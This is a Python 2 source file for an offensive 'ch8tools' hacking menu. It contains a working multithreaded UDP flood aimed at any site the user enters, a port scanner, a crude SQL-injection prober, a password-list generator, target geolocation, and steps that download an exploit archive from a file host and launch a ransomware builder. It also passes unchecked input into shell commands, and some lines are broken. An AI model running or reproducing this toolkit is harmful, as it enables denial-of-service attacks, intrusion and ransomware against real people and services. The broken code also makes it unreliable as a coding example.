import os , hashlib , thread , time , socket , sys , pyfiglet , random , requests
import urllib , json , itertools

# -------------------------------------

class color:

    purple = '\033[34m'
    blue = '\033[94m'
    Green = '\033[92m'
    yellow = '\033[93m'
    red = '\033[91m'
    end = '\033[0m'

# clear terminal page

os.system("clear")
os.system("clear")

# random banner

randombanner = random.randint(1,5)

if randombanner == 1:
 print pyfiglet.figlet_format('ch8tools' , font = "larry3d")

if randombanner == 2:
 print pyfiglet.figlet_format('ch8tools' , font = "banner")

if randombanner == 3:
 print pyfiglet.figlet_format('ch8tools' , font = "cricket")

if randombanner == 4:
 print pyfiglet.figlet_format('ch8tools' , font = "doom")

if randombanner == 5:
 print pyfiglet.figlet_format('ch8tools' , font = "avatar")

# About Us

print color.purple + """
Python Coder    : Mr.Crazy8
C Coder         : Ali.A
Github Crazy8   : https://github.com/MrCrazy8
Telegram Crazy8 : https://telegram.me/LightGreen_heart
weblog Crazy8   : https://mr-crazy8.tk
Github Ali.A    : https://github.com/alirezaarzehgar
Telegram Ali.A  : https://telegram.me/include_Ali

Suitable for linux os
""" + color.end
time.sleep(2)
os.system("clear")
os.system("clear")

# -------------------------------------


print color.red +  '''

       ,#############################,
       ################################
      ##################################
      ###                            ###
      ###   $$$$$            $$$$$   ###
      ###   $$$$$            $$$$$   ###
      ###    ```      """     ```    ###
       ###           """""          ###
       ###           """""          ###
        ###                        ###
         ###                      ###
          ###                    ###
             ====================
             =||||||||||||||||||=
             =------------------=
             =||||||||||||||||||=
             ====================

''' + color.end

print color.purple + ''' Code By : Crazy8 & Ali.A     Telegram : @LightGreen_heart
                         v2.4''' + color.end

# -------------------------------------

# options

print color.yellow +  '''

[1] DDoS Attack		[2] Hash Maker

[3] Port Scanner	[4] Get site ip

[5] Download web tools	[6] Download hack tools

[7] Make A Password	[8] Download Kali linux bash for termux

[9] Copy Source		[10] scan website

[11] exploits(beta)	[12] get target location

[13] get information	[14] Password List Generator

[15] make ransomware	[16] convert file to .exe

[00] About		[99] Exit

''' + color.end

# orginal input

input1 = raw_input(color.Green + " CH8 ~> " + color.end)
print "   "

# -------------------------------------

# DDos Attack

if input1 == "1":

 os.system("clear")
 print color.red + pyfiglet.figlet_format('DDoS' , font='doom') + color.end
 site = raw_input(color.blue + "site-url => ")
 print "   "
 thread_count = input("thread => ")

 ip = socket.gethostbyname(site)

 UDP_PORT = 80
 MESSAGE = "Crazy8"
 print "UDP target IP:", ip
 print "UDP target port:", UDP_PORT
 time.sleep(3)

 def dos(i):
        while True:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        sock.sendto(MESSAGE, (ip, UDP_PORT))
                        print "Packet Sent"

 for i in range(thread_count):
        try:
         thread.start_new_thread( dos , ("Thread-"+str(i),) )
        except KeyboardInterrupt:
                        sys.exit(0)
 while 1:
  pass

# -------------------------------------

# make a hash

if input1 == "2" :

 os.system("clear")

 print color.blue + "   "

 result = pyfiglet.figlet_format('Hash Maker' , font = 'slant')

 print result
 print color.purple + ''' Code By : Crazy8                 Telegram : @LightGreen_heart
'''
# -----------------------------------

 print color.yellow +  '''

[1] MD5

[2] SHA-1

[3] SHA-224

[4] SHA-256

[99] Back

''' + color.end
 print "   "

 model = raw_input(color.red + "number ~>")

 print "   "

 if model == "1":
  inputer = raw_input(color.red + "Your-Text ~>")
  md5 = hashlib.md5()

  md5.update(inputer)

  print color.Green + "{+} md5 your password is >>> ",md5.hexdigest()

  print "    "
  print color.purple + "Back To Main Menu on 5 sec" + color.end
  time.sleep(5)
  os.system("python2 ch8.py")
 if model == "2":
  inputer = raw_input(color.red + "Your-Text ~>")
  sha1 = hashlib.sha1()

  sha1.update(inputer)

  print color.Green + "{+} sha1 your password is >>> ",sha1.hexdigest()

  print "   "
  print color.purple + "Back To Main Menu on 5 sec" + color.end
  time.sleep(5)
  os.system("python2 ch8.py")

 if model == "3":
  inputer = raw_input(color.red + "Your-Text ~>")
  sha224 = hashlib.sha224()

  sha224.update(inputer)

  print color.Green + "{+} sha224 Your Password is >>> " , sha224.hexdigest()

  print "  "
  print color.purple + "Back To Main Menu on 5 sec" + color.end
  time.sleep(5)
  os.system("python2 ch8.py")
 if model == "4":
  inputer = raw_input(color.red + "Your-Text ~>")

  sha256 = hashlib.sha256()
  sha256.update(inputer)
  print color.Green + "sha-256 Your Password is >>> " , sha256.hexdigest()
  print color.purple + "Back To Main Menu on 5 sec" + color.end
  time.sleep(5)
  os.system("python2 ch8.py")

 # back to main menu

 if model == "99":

  os.system("python2 ch8.py")

# -------------------------------------

# scan open port

if input1 == "3":

 os.system("clear")
 print color.red + pyfiglet.figlet_format('Port Scan' , font='larry3d') + color.end
 host = raw_input(color.Green + "Target-ip ~>")
 print "   "
 range1 = int(input("range1-Port ~>"))
 print "   "
 range2 = int(input("range2-Port ~> "))

 print "   "

# -------------------------------------

 for i in range(range1,range2):

               s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)

               s.settimeout(1)

               re = s.connect_ex((host,i))

               if re == 0:

                    service = getservbyport(i)

                    print "[+] Port : " ,service,i,"open"

               else :

                    print "[+] Port : " , i, "close"
 print color.purple + "Back To Main Menu on 5 sec" + color.end
 time.sleep(5)
 os.system("python2 ch8.py")
# -------------------------------------

# get website ip

if input1 == "4":

  os.system("clear")
  print color.red + pyfiglet.figlet_format('IP' , font='larry3d') + color.end
  myin = raw_input(color.red + "url ~> ")
  hoste = socket.gethostbyname(myin)
  print color.blue+"IP : "+ hoste
  back = raw_input("Do You Want Back To Menu [Y/N] ~>")
  if back.lower() == "y":
    os.system("python2 ch8.py")
  if back.lower() == "n":
    print " "

# -------------------------------------

# download and install web tools

if input1 == "5":
  os.system("clear")
  print color.red + pyfiglet.figlet_format('web tools' , font='banner') + color.end
  print color.Green + '''

[1] skipfish

[2] golismero

[3] nmap

[4] bpc

[5] sqlmap

[99] back

'''
  lin = raw_input("Number ~> ")
# -------------------------------------
  if lin == "1" :

    os.system("apt-get install git")
    os.system("git clone https://github.com/spinkham/skipfish")
    print color.purple + "Back To Main Menu on 5 sec" + color.end
    time.sleep(5)
    os.system("python2 ch8.py")
# -------------------------------------

  if lin == "2":

    os.system("apt-get install git")
    os.system("git clone https://github.com/golismero/golismero")
    print color.purple + "Back To Main Menu on 5 sec" + color.end
    time.sleep(5)
    os.system("python2 ch8.py")
# -------------------------------------

  if lin == "3":

    os.system("apt-get install nmap")
    print color.purple + "Back To Main Menu on 5 sec" + color.end
    time.sleep(5)
    os.system("python2 ch8.py")

# -------------------------------------

  if lin == "4":

    os.system("apt-get install git")
    os.system("git clone https://github.com/MrCrazy8/bpc")
    print color.purple + "Back To Main Menu on 5 sec" + color.end
    time.sleep(5)
    os.system("python2 ch8.py")

# -------------------------------------

  if lin == "5":
    os.system("git clone https://github.com/sqlmapproject/sqlmap")
    print color.purple + "Back To Main Menu on 5 sec" + color.end
    time.sleep(5)
    os.system("python2 ch8.py")

  if lin == "99":
    os.system("python2 ch8.py")
# -------------------------------------

# install hacking tools

if input1 == "6":

  os.system("git clone https://github.com/hacktoolspack/hack-tools")
  os.system("git clone https://github.com/thelinuxchoice/anonymouse")
  os.system("git clone https://github.com/MrCrazy8/Prepare")
  print color.purple + "Back To Main Menu on 5 sec" + color.end
  time.sleep(5)
  os.system("python2 ch8.py")

# -------------------------------------

# make a secure password

if input1 == "7":

  os.system("clear")
  print color.red + pyfiglet.figlet_format('Password' , font='avatar') + color.end
  ra = random.randint(167,236)
  rs = random.randint(781,928)
  pin = raw_input(color.blue + "Enter The Text > ")
  st = pin[::-1]
  print "     "
  print color.blue + "YOUR PASSWORD : " + color.red + str(ra) + pin +"8bo$"+ str(rs) + st
  print color.purple + "Back To Main Menu on 5 sec" + color.end
  time.sleep(5)
  os.system("python2 ch8.py")

# -------------------------------------

# download and install kali linux bash

if input1 == "8":

  os.system("clear")
  print color.red + pyfiglet.figlet_format('ch8tools' , font='larry3d') + color.end
  os.system("pkg install wget openssl-tool proot -y")
  os.system("hash -r")
  os.system("wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/Kali/kali.sh")
  os.system("bash kali.sh")
  os.system("./start-kali.sh")

# -------------------------------------

# copy source site

if input1 == "9":

  os.system("clear")
  print color.red + pyfiglet.figlet_format('source' , font='cricket') + color.end
  print color.red  + "example : google.com\n" + color.end
  inputln = raw_input(color.yellow + "Url ~>")
  source  = requests.get(inputln )
  ra = random.randint(1,3000)
  file = open("{}.html".format(ra),"w")
  file.write(str(source.text))
  file.close()
  print color.red + "Done"
  print color.purple + "Back To Main Menu on 5 sec" + color.end
  time.sleep(5)
  os.system("python2 ch8.py")


# -------------------------------------

# scan website with nmap , netcat , python for sqli

if input1 == "10":

 os.system("clear")
 print color.red + pyfiglet.figlet_format('web scan' , font='banner') + color.end
 ip = raw_input(color.yellow + "target-ip/url ~>" + color.end)
 os.system("clear")
 print color.Green + "\nstart Scan\n" + color.end
 os.system("nmap -v "+ip)
 os.system("nc -z "+ip+" 1-443")
 payload = ["'" , '"' , "/"]
 p = "'"
 for i in payload:
  requ = requests.post(ip+i)
  src  = requ.text
  if "mysql" in src.lower():
   print color.blue + "Website Has A sql injection" + color.end
  elif "SQL syntax" in src.lower :
   print color.blue + "Website Has A Sql Injection" + color.end
  else :
   print color.blue + "website doesnt has a sqli"   + color.emd
 print color.red + "clear the terminal and back to Main Menu on 5 sec" + color.end
 time.sleep(5)
 os.system("python2 ch8.py")

# -------------------------------------

# download exploits

if input1 == "11":

 os.system("clear")
 print color.red + pyfiglet.figlet_format('exploits' , font = 'slant')
 print color.yellow + "this option is beta\n" + color.end
 os.system("wget http://s10.picofile.com/d/8395932718/a34071ac-17b5-434e-ade2-ca87e889892e/839438")
 os.system("mv 839438 exploits.zip")
 os.system("unzip -x exploits.zip")
 os.system("rm exploits.zip")
 print color.blue + "\nexploits installed on ch8tools/exploits" + color.end
 print color.purple + "\nBack To Main Menu on 5 sec" + color.end
 time.sleep(5)
 os.system("python2 ch8.py")


# -------------------------------------

# get target location with ip

if input1 == "12":

 os.system("clear")
 print color.red + pyfiglet.figlet_format('inforamtion' , font='cricket') + color.end
 ipinput = raw_input(color.Green + "Target-IP ~>" + color.end)
 x = urllib.urlopen("https://ipinfo.io/"+ipinput+"/json")
 y = json.load(x)
 resualt = y['loc']
 print color.red + "\ntarget location on google map :"+resualt+"\nCH8TOOLS" + color.end 
 print color.purple + "Back To Main Menu on 5 sec" + color.end
 time.sleep(5)
 os.system("python2 ch8.py")

# -------------------------------------

# get informaiton with target ip

if input1 == "13":

  os.system("clear")
  print color.red + pyfiglet.figlet_format('inforamtion' , font='cricket') + color.end
  ipinput = raw_input(color.Green + "Target-IP ~>" + color.end)
  k = urllib.urlopen("https://ipinfo.io/"+ipinput+"/json")
  b = json.load(k)
  timezone = b['timezone']
  country  = b['country']
  city     = b['city']
  org      = b['org']

  print color.red + "\ntarget ("+ipinput+") information :" + color.end + color.Green + "\ncountry : "+country+"\ncity : " +city+"\ntimezone : "+timezone+"target org : "+org + color.end
  print color.yellow + "\nch8tools" +color.end
  print color.purple + "Back To Main Menu on 5 sec" + color.end
  time.sleep(5)
  os.system("python2 ch8.py")

# -------------------------------------
# Generate Password List

if input1 == "14":

 os.system("clear")
 print color.Green + pyfiglet.figlet_format('PassList Generator' , font = "doom")
 chars = raw_input(color.red + "character ~>" + color.end)
 countchar = raw_input(color.red + "\nchar-count ~>" + color.end)
 s = int(countchar)
 ra = random.randint(1,3000)
 for x in itertools.product(chars , repeat=s):
  text = ''.join(x)
  file = open(str(ra)+".txt" , "a")
  file.write(text+"\n")
  file.close()

 print color.yellow + "Done!\nFile Name : "+str(ra)+".txt" + color.end
 print color.purple + "Back To Main Menu on 5 sec" + color.end
 time.sleep(5)
 os.system("python2 ch8.py")

# -------------------------------------
# convert file to .exe

if input1 == "16":

  os.system("clear")
  print color.red + pyfiglet.figlet_format('converter' , font='slant') + color.end
  print color.yellow + '''
[1] convert .py to .exe

[2] convert .rb to .exe

[3] download binder for bind file to image 

[99] back
 ''' + color.end
  cvtinput = raw_input(color.Green + "Number ~>" + color.end)

  if cvtinput == "1":
    numinp = raw_input(color.Green + "filename ~>"+ color.end)
    os.system("pyinstaller "+numinp)
    print color.purple + "\nBack To Main Menu on 5 sec" + color.end
    time.sleep(5)
    os.system("python2 ch8.py")
  if cvtinput == "2":
    numinp = raw_input(color.Green+"filename ~>"+color.end)
    os.system("orca "+numinp)
    print color.purple + "\nBack To Main Menu on 5 sec" + color.end
    time.sleep(5)
    os.system("python2 ch8.py")
  if cvtinput == "3":
    os.system("git clone https://github.com/alirezaarzehgar/AL-Embedder")
    print "\ndownload is compelete"
    print color.purple + "\nBack To Main Menu on 5 sec" + color.end
    time.sleep(5)
    os.system("python2 ch8.py")

# -------------------------------------

# About Us 00

if input1 == "00":

 os.system("clear")
 print color.Green + '''
[c] Python Coder    : Mr.Crazy8
[h] C Coder         : Ali.A
[8] Github Crazy8   : https://github.com/MrCrazy8
''' + color.end+'''
[T] Telegram Crazy8 : https://telegram.me/LightGreen_heart
[o] weblog Crazy8   : https://mr-crazy8.tk
[o] Github Ali.A    : https://github.com/alirezaarzehgar
'''+color.red + '''
[l] Telegram Ali.A  : https://telegram.me/include_Ali
[s] suitable for linux os
''' + color.end

 print color.purple + "\nBack To Main Menu on 5 sec" + color.end
 time.sleep(5)
 os.system("python2 ch8.py")


if input1 == "15":

 os.system("clear")
 os.system("./RansomCreator")
 print color.purple + "\nBack To Main Menu on 5 sec" + color.end
 time.sleep(5)
 os.system("python2 ch8.py")

# -------------------------------------
# exit menu

if input1 == "99":

 os.system("clear")
 print color.red + pyfiglet.figlet_format('Good Bye' , font='larry3d') + color.end
 time.sleep(1)
 os.system("clear")
 
